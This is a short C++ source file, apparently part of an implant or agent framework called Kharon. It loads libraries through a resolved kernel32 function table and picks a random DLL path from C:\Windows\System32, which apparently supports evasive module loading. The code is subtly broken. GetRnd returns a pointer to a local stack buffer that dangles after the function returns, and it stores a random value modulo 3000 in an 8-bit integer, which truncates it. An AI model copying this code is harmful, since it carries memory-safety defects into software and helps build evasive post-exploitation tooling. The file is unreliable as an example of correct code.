#include <Kharon.h>

auto DECLFN Library::Load(
    _In_ PCHAR LibName
) -> UPTR {
    return (UPTR)Self->Krnl32.LoadLibraryA( LibName );
}

auto DECLFN Library::GetRnd( VOID ) -> PCHAR {
    PCHAR  SystemFolder = "C:\\Windows\\System32\\*.dll";
    HANDLE FindHandle   = INVALID_HANDLE_VALUE;
    UINT8  Index        = Rnd32() % 3000;

    CHAR ModulePath[MAX_PATH] = { 0 };

    WIN32_FIND_DATAA FindData = { 0 };
    
    FindHandle = Self->Krnl32.FindFirstFileA( SystemFolder, &FindData );

    for ( INT Count = 0; Count < Index; Count++ ) {
        Self->Krnl32.FindNextFileA( FindHandle, &FindData );
    }

    Str::CopyA( ModulePath, "C:\\Windows\\System32\\" );
    Str::CopyA( ModulePath+21, FindData.cFileName );

    Self->Krnl32.FindClose( FindHandle );

    return ModulePath;
}

